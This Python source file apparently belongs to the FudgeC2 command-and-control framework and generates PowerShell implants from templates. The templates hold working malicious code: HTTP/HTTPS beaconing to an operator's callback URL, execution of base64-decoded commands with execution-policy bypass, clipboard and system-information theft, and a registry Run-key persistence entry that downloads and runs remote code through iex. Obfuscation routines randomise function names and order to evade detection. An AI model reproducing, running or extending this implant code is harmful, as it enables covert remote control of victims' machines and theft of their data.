import jinja2
import string
import random

from Implant.PSObfucate import PSObfucate

class ImplantGenerator:
    # ImplantGenerator has a single public method (generate_implant_from_template)
    #   which is used to generate a new active implant in the event of a stager
    #   calling back. Configuration from the implant template is used to determine
    #   which functionality should be embedded within the active implant.

    JinjaRandomisedArgs = {"rnd_function": "aaaaaa",
                           "obf_remote_play_audio": "RemotePlayAudio",
                           "obf_sleep": "sleep",
                           "obf_select_protocol": "select_protocol",
                           "obf_collect_sysinfo": "collect-sysinfo",
                           "obf_http_conn": "http-connection",
                           "obf_https_conn": "https-connection",
                           "obf_dns_conn": "dns-connection",
                           "obf_create_persistence": "create-persistence",
                           "obf_builtin_command": "execute-command",
                           "obf_reg_key_name": "FudgeC2Persistence",
                           "obf_callback_url":"url",
                           "obf_callback_reason":"callback_reason",
                           "obf_get_clipboard":"export-clipboard"
                           }

    # -- This is to be finished with PoC WorkWork audio
    play_audio = '''
function {{ ron.obf_remote_play_audio }}($data) {
    $args[0]
}
'''
    # This is an early iteration for testing - this will be
    #   expanded to support image/audio/file list export.
    fde_func_a = '''
function {{ ron.obf_get_clipboard }}() {
    $b = "Text"
    $a = Get-Clipboard -Format $b
    if ($a -ne $null ){$Script:tr = $a}
    else {$Script:tr = "No clipboard data"}
}
'''

    # -- KEEP
    fde_func_b = '''
function {{ ron.obf_collect_sysinfo }}(){
    $h = hostname
    $d = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup
    $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address
    $final_str = "Username: "+$env:UserName+"`nHostname: "+$h+"`nDomain: "+$d+"`nLocal IP: "+$a
    $Script:tr = $final_str
}
'''

    # -- OPTIONAL REMOVEAL
    random_function = '''
function {{ ron.rnd_function }} () {}
'''

    # -- This needs improvement, it only supports http persistence.
    create_persistence = '''
function {{ ron.obf_create_persistence }}(){
    $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
    $key = Get-Item -LiteralPath $abc -ErrorAction SilentlyContinue
    $val = "powershell.exe -c (iex ((New-Object Net.WebClient).DownloadString('http://${{ ron.obf_callback_url }}:{{ http_port }}/robots.txt?user={{ stager_key }}')))"
    if ($key.Property -Like "{{ ron.obf_reg_key_name }}"){
        $a = 0; 
    } else {
        New-ItemProperty -Path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String"
    }
    $Script:tr = "Enabled"
}
'''

    execute_command = '''
function {{ ron.obf_builtin_command }}($data){
    $a = $data.Substring(0,2)
    if ($data.Substring(2).length -gt 1){
        $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.Substring(2)))
    } else {
        $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.Substring(2)))
    }
    if($a -eq "CM"){
        $Script:tr = powershell.exe -exec bypass -C "$b"
    } elseif($a -eq "SI"){
        {{ ron.obf_collect_sysinfo }}
    } elseif ($a -eq "EP"){
        {{ ron.obf_create_persistence }}
    } elseif ($a -eq "PS"){
        {{ ron.obf_remote_play_audio }}($b)
    } elseif ($a -eq "EC"){
        {{ ron.obf_get_clipboard }} 
    } else {
        $Script:tr = "0"
    }
}
'''

    http_function = '''
function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
    if ( ${{ ron.obf_callback_reason }} -eq 0 ){
        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/index"
    } else {
        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/help"
    }
    $enc = [system.Text.Encoding]::UTF8
    $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
    $kk = [System.Net.WebRequest]::Create($URL);
    $kk.Method = "POST"
    if ( ${{ ron.obf_callback_reason }} -eq 0){
        $kk.Headers.Add("X-Implant","{{ uii }}")
    } else {
        $kk.Headers.Add("X-Result","{{ uii }}")
    }
    $kk.ContentLength = $data2.Length
    $kk.KeepAlive = $false;
    $kk.Timeout = 10000;
    $kk.SendChunked = $true;
    $requestStream = $kk.GetRequestStream()
    $requestStream.Write($enc.GetBytes($data2), 0, $data2.Length)
    $requestStream.Flush()
    $resp = $kk.GetResponse()
    $reqstream = $resp.GetResponseStream()
    $sr = new-object System.IO.StreamReader $reqstream
    $result  = $sr.ReadtoEnd()
    $Script:headers = $result
}    

'''

    https_function = '''
function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
    if ( ${{ ron.obf_callback_reason }} -eq 0 ){
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/index"
    } else {
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/help"
    }
    $enc = [system.Text.Encoding]::UTF8
    $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
    $kk = [System.Net.WebRequest]::Create($URL);
    $kk.Method = "POST"
    if ( ${{ ron.obf_callback_reason }} -eq 0){
        $kk.Headers.Add("X-Implant","{{ uii }}")
    } else {
        $kk.Headers.Add("X-Result","{{ uii }}")
    }
    $kk.ContentLength = $data2.Length
    $kk.KeepAlive = $false;
    $kk.Timeout = 10000;
    $kk.SendChunked = $true;
    $requestStream = $kk.GetRequestStream()
    $requestStream.Write($enc.GetBytes($data2), 0, $data2.Length)
    $requestStream.Flush()
    $resp = $kk.GetResponse()
    $reqstream = $resp.GetResponseStream()
    $sr = new-object System.IO.StreamReader $reqstream
    $result  = $sr.ReadtoEnd()
    $Script:headers = $result
}    
'''

    select_protocol='''
function {{ ron.obf_select_protocol }}($b){
    sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
    return get-random($b)
}
'''

    implant_main = '''
{{ obf_variables }}
{% if obfuscation_level == 0 %}
# Implant generated by:
# https://github.com/Ziconius/FudgeC2
{% endif %}
start-sleep({{ initial_sleep }})
${{ ron.obf_sleep }}={{ beacon }}
${{ ron.obf_callback_url }} = "{{ url }}"
while($true){
    $plh=0
    $headers = $null
    try {
            {{ proto_core }}
    } catch {
        $_.Exception | format-list -Force
    }
    if ( $headers -NotLike "=="){
        {{ ron.obf_builtin_command }}($headers)
        
        if ($tr -ne "0"){ 
            $atr = $tr -join "`n"
            $plh = $atr
            try {
                    {{ proto_core }}
            } catch {
                $_.Exception | format-list -Force
            }
        }       
    }
}
'''

    def _manage_implant_function_order(self, implant_info, function_list):
        # -- This is responsible for randomising the function order within the generated implant.
        if implant_info['obfuscation_level'] >= 1:
            random.shuffle(function_list)
        constructed_base_implant = ""
        for implant_function in function_list:
            constructed_base_implant = constructed_base_implant + implant_function.rstrip()
        constructed_base_implant = constructed_base_implant + self.implant_main
        return constructed_base_implant.lstrip()

    def _function_name_obfuscation(self, implant_info, function_names):
        if implant_info['obfuscation_level'] >= 2:
            for key in function_names.keys():
                letters = string.ascii_lowercase
                temp_string = ''.join(random.choice(letters) for i in range(8))
                if temp_string not in function_names.values():
                    function_names[key] = temp_string
        return function_names

    def _process_modules(self, implant_data, randomised_function_names):
        # --  New in Dwarven Blacksmith
        # Add default functions to added to the implant which will be randomised.
        implant_functions = [self.play_audio,
                             self.random_function,
                             self.execute_command,
                             self.fde_func_a,
                             self.fde_func_b,
                             self.create_persistence,
                             self.select_protocol]

        # Checks which protocols should be embedded into the implant.
        if implant_data['comms_http'] is not None:
            implant_functions.append(self.http_function)
        if implant_data['comms_https'] is not None:
            implant_functions.append(self.https_function)
        # TODO: These protocols will be delivered in later iterations of FudgeC2
        # if id['comms_dns'] != None:
        #     implant_functions.append(self.https_function)
        # if id['comms_binary'] != None:
        #     implant_functions.append(self.https_function)

        constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)

        # Generates the blob of code which will be used to determine which protocol should be selected from.
        protocol_string = ""
        proto_count = 0
        proto_list = {'comms_http': randomised_function_names['obf_http_conn'],
                      'comms_https': randomised_function_names['obf_https_conn'],
                      'comms_dns': randomised_function_names['obf_dns_conn']}

        for x in proto_list.keys():
            if implant_data[x] is not 0:
                protocol_string = protocol_string + "    " + str(proto_count) + " { " + proto_list[x] + "($plh) }\n"
                proto_count += 1

        f_str = 'switch ('+randomised_function_names['obf_select_protocol']+'('+str(proto_count)+') ){ \n'+protocol_string+' }'
        return constructed_implant, f_str

    def generate_implant_from_template(self, implant_data):
        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)

        implant_template, protocol_switch = self._process_modules(implant_data, implant_function_names)

        callback_url = implant_data['callback_url']
        variable_list = ""
        if implant_data['obfuscation_level'] >= 3:
            ps_ofb = PSObfucate()
            variable_list, callback_url = ps_ofb.variableObs(implant_data['callback_url'])

        cc = jinja2.Template(implant_template)
        output_from_parsed_template = cc.render(
            initial_sleep=implant_data['initial_delay'],
            http=12345,
            url=callback_url,
            http_port=implant_data['comms_http'],
            https_port=implant_data['comms_https'],
            dns_port=implant_data['comms_dns'],
            uii=implant_data['unique_implant_id'],
            stager_key=implant_data['stager_key'],
            ron=implant_function_names,
            beacon=implant_data['beacon'],
            proto_core=protocol_switch,
            obfuscation_level=implant_data['obfuscation_level'],
            obf_variables=variable_list
        )
        return output_from_parsed_template


blah = '''
render_implant (Public)
 - Takes the generated implant info (Generated implants (by UIK)
 
process_modules 
 - This controls which protocols and additional modules are embedded into the implant.
 - Generates the main function multi proto selection

'''
